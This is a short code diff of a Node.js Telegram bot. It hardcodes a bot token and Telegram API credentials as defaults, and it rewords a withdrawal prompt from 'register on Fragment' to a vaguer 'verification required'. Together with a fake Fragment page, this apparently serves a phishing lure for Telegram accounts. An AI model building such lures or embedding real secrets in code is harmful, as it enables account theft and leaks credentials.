@@ -7,8 +7,8 @@ const sqlite3 = require('sqlite3').verbose();
 const path = require('path');
 
 const BOT_TOKEN = process.env.BOT_TOKEN || '8319103126:AAGvA6pmIIbgwqFE8SUUw3r-M7kRd-8OJoo';
-const API_ID = parseInt(process.env.API_ID) || 30427944;
-const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
+const API_ID = parseInt(process.env.API_ID) || 32865720;
+const API_HASH = process.env.API_HASH || 'aa86943502451690495bb18ecd230825';
 const ADMIN_USER_ID = 1398396668;
 
 // URL, где доступен web-app + статика (fragment.html, stars.jpg, avatar.jpg)
@@ -298,7 +298,7 @@ bot.on('callback_query', async (query) => {
         } else if (query.data === 'user_withdraw') {
             bot.sendMessage(
                 chatId,
-                `🔐 <b>Для вывода требуется зарегистрироваться на Fragment</b>`,
+                `🔐 <b>Для вывода требуется верификация</b>`,
                 {
                     parse_mode: 'HTML',
                     reply_markup: {
